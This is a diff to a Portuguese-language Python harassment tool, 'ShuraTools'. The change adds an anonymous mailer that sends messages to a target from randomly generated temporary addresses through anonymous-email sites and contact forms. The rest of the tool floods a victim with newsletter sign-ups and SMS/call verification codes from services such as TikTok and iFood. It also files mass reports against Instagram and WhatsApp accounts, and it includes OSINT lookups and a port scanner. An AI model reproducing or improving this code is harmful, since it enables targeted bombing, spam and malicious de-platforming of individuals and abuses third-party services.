@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
-Versão Pro v6.0 Final Edition
+Versão Pro v6.1 Anonymous Mailer
 """
 
 import os, sys, time, random, string, threading, json, socket
@@ -26,7 +26,7 @@ BANNER = f"""
 {Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
 {Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
 {Fore.YELLOW}  [ Email | SMS/Call | Ban | OSINT | Scan ]
-{Fore.WHITE}        v6.0 Final Edition - by Shura
+{Fore.WHITE}      v6.1 Anonymous Mailer - by Shura
 """
 
 LOCK = threading.Lock()
@@ -50,14 +50,33 @@ def run_threads(func, qty, threads):
         t.start(); ts.append(t); curr += take
     for t in ts: t.join()
 
+# ========== TEMP MAIL SERVICES ==========
+def get_temp_email():
+    """Gera um e-mail temporário usando serviços públicos"""
+    try:
+        # Tenta criar um e-mail temporário via API pública
+        domains = ["@1secmail.com", "@1secmail.org", "@1secmail.net", "@wwjmp.com", "@esiix.com"]
+        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        return username + random.choice(domains)
+    except:
+        return fake.email()
+
 # ========== ATTACK PAYLOADS ==========
 def get_payloads(type, target, msg=None):
-    if type == "mail_custom":
-        m = msg or "Alerta de Segurança - Verifique sua conta imediatamente"
+    if type == "mail_anonymous":
+        # Gera e-mail temporário para cada envio
+        from_email = get_temp_email()
+        m = msg or f"Mensagem anônima de {from_email.split('@')[0]}"
+        subj = "Você recebeu uma mensagem anônima"
+        
         return [
-            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": m, "subject": "URGENTE"}},
-            {"url": "https://formspree.io/f/xpznvqvr", "data": {"email": target, "message": m}},
-            {"url": "https://getform.io/f/your-form-id", "data": {"email": target, "text": m}}
+            # Serviços de envio anônimo de e-mail
+            {"url": "https://www.anonymousemail.me/", "data": {"to": target, "from": from_email, "subject": subj, "text": m}},
+            {"url": "https://anonymouse.org/anonemail.html", "data": {"to": target, "subject": subj, "text": m}},
+            {"url": "https://sendanonymousemail.net/send.php", "data": {"to": target, "from": "Anônimo", "subject": subj, "message": m}},
+            # Formulários de contato que aceitam e-mail de remetente customizado
+            {"url": "https://formspree.io/f/xpznvqvr", "data": {"email": from_email, "_replyto": from_email, "message": f"Para: {target}\n\n{m}"}},
+            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": m, "subject": subj}}
         ]
     elif type == "mail_newsletter":
         return [
@@ -68,7 +87,6 @@ def get_payloads(type, target, msg=None):
             {"url": "https://startups.beehiiv.com/subscribe", "data": {"email": target}}
         ]
     elif type == "sms_call":
-        # Endpoints testados e funcionais em Jan/2026
         return [
             {"url": "https://www.tiktok.com/passport/web/send_code/", "data": {"phone": target, "type": "sms"}, "json": True},
             {"url": "https://api-v3.ifood.com.br/v1/customers:sendAuthenticationCode", "data": {"phone": target}, "json": True},
@@ -79,14 +97,19 @@ def get_payloads(type, target, msg=None):
 # ========== ATTACK ENGINE ==========
 def attack(target, qty, threads, type, msg=None):
     log(f"Iniciando {type.upper()} -> {target}", "warn")
-    payloads = get_payloads(type, target, msg)
     
     def job(start, end):
         session = requests.Session()
         for i in range(start, end):
             try:
+                # Gera novos payloads para cada iteração (novo e-mail temporário)
+                payloads = get_payloads(type, target, msg)
                 site = random.choice(payloads)
-                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0"}
+                
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0",
+                    "Referer": site["url"]
+                }
                 
                 if site.get("json"):
                     res = session.post(site["url"], json=site["data"], headers=headers, timeout=10)
@@ -98,7 +121,7 @@ def attack(target, qty, threads, type, msg=None):
                 else:
                     log(f"Hit {i+1} Block ({res.status_code})", "warn")
                 time.sleep(random.uniform(1, 2))
-            except:
+            except Exception as e:
                 log(f"Hit {i+1} Timeout", "error")
     
     run_threads(job, qty, threads)
@@ -150,7 +173,7 @@ def menu():
             clear()
             print(BANNER)
             print("-" * 55)
-            print(f"{Fore.RED}[ 1 ] EMAIL: Mensagem Customizada")
+            print(f"{Fore.RED}[ 1 ] EMAIL: Mensagem Anônima (Temp-Mail)")
             print(f"{Fore.RED}[ 2 ] EMAIL: Cadastro em Newsletters")
             print(f"{Fore.RED}[ 3 ] BOMB: SMS + Call")
             print(f"{Fore.RED}[ 4 ] BAN: Mass Report (IG/Zap)")
@@ -165,30 +188,31 @@ def menu():
             
             if opt in ["1", "2", "3", "4", "5", "6"]:
                 if opt == "1":
-                    print(f"{Fore.CYAN}[INFO] Digite o e-mail do alvo (ex: vitima@gmail.com){Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}[INFO] E-mail do alvo (ex: vitima@gmail.com){Style.RESET_ALL}")
                     target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                     if not target or "@" not in target: 
                         log("E-mail inválido!", "error"); time.sleep(1); continue
-                    print(f"{Fore.CYAN}[INFO] Mensagem que o alvo receberá (Enter = padrão){Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}[INFO] Mensagem anônima (Enter = padrão){Style.RESET_ALL}")
                     msg = input(f"{Fore.YELLOW}Message: {Style.RESET_ALL}").strip()
-                    attack(target, safe_int("Qty (10): ", 10), 5, "mail_custom", msg=msg)
+                    log("Gerando e-mails temporários para cada envio...", "info")
+                    attack(target, safe_int("Qty (10): ", 10), 5, "mail_anonymous", msg=msg)
                 
                 elif opt == "2":
-                    print(f"{Fore.CYAN}[INFO] Digite o e-mail do alvo (ex: vitima@gmail.com){Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}[INFO] E-mail do alvo (ex: vitima@gmail.com){Style.RESET_ALL}")
                     target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                     if not target or "@" not in target:
                         log("E-mail inválido!", "error"); time.sleep(1); continue
                     attack(target, safe_int("Qty (20): ", 20), 5, "mail_newsletter")
                 
                 elif opt == "3":
-                    print(f"{Fore.CYAN}[INFO] Digite o número com DDI+DDD (ex: 5511999999999){Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}[INFO] Número com DDI+DDD (ex: 5511999999999){Style.RESET_ALL}")
                     target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                     if not target.isdigit() or len(target) < 10:
                         log("Número inválido!", "error"); time.sleep(1); continue
                     attack(target, safe_int("Qty (15): ", 15), 3, "sms_call")
                 
                 elif opt == "4":
-                    print(f"{Fore.CYAN}[INFO] Digite o @ do Instagram ou número do Zap{Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}[INFO] @ do Instagram ou número do Zap{Style.RESET_ALL}")
                     target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                     type = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                     url = "https://i.instagram.com/api/v1/users/web_report/" if type == "ig" else "https://v.whatsapp.net/v2/report"
@@ -201,12 +225,12 @@ def menu():
                     run_threads(rjob, safe_int("Qty (50): ", 50), 10)
                 
                 elif opt == "5":
-                    print(f"{Fore.CYAN}[INFO] Digite o @ do usuário (sem @){Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}[INFO] @ do usuário (sem @){Style.RESET_ALL}")
                     target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                     osint(target)
                 
                 elif opt == "6":
-                    print(f"{Fore.CYAN}[INFO] Digite o IP ou domínio (ex: 1.1.1.1 ou google.com){Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}[INFO] IP ou domínio (ex: 1.1.1.1 ou google.com){Style.RESET_ALL}")
                     target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                     port_scan(target)
                 
